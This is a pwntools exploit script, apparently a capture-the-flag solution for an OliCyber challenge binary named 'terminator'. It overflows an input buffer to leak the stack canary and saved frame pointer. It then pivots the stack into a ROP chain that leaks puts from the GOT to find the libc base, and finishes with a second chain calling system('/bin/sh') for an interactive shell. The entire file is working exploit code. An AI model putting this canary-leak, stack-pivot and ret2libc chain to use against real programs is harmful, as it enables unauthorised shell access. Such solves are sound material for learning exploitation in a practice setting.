from pwn import *
libc = ELF("./libc.so.6")
elf = ELF('./terminator')
if args.REMOTE:
  r = remote("terminator.challs.olicyber.it", 10307)
else:
  r = gdb.debug("./terminator", """
    b *welcome + 174
    continue
  """, env={"LD_PRELOAD": "./libc.so.6"})
  
r.recvuntil(b"> ")
r.sendline(b"A"*55)
r.recvuntil(b'\n\n')
canary = b'\0'+ r.recv(7) #the canary is 8 bytes long, but the first byte is always null, so we add it because it is overwritten by \n
rbp = u64(r.recv(6).ljust(8, b'\0')) - 96

print(canary.hex(), len(canary))
print(p64(rbp).hex(), len(p64(rbp)))
r.recvuntil(b"> ")

r.send(b'A' * 8 + p64(0x4012fb) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main']) + b'A' * 16 + canary  + p64(rbp)) 
#                     pop_rdi         got.puts        puts            main
#you can use the rbp to overwrite the return address, because when you overwrite the rbp and then leave and ret, the return address will be the value of the rbp, consequently causing a rop chain
r.recvline()
puts = u64(r.recvline()[:-1].ljust(8, b'\0'))
print(hex(puts), hex(libc.sym['puts']))

libc.address = puts - libc.sym['puts']

r.recvuntil(b"> ")
r.sendline(b"A"*55)
r.recvuntil(b'\n\n')
canary = b'\0'+ r.recv(7) #the canary is 8 bytes long, but the first byte is always null, so we add it because it is overwritten by \n
rbp = u64(r.recv(6).ljust(8, b'\0')) - 96
r.recvuntil(b"> ")

r.send(b'/bin/sh\x00' + p64(0x4012fb) + p64(rbp) + p64(0x4012FC) + p64(libc.sym['system']) + b'A' * (16) + canary  + p64(rbp)) 

r.interactive()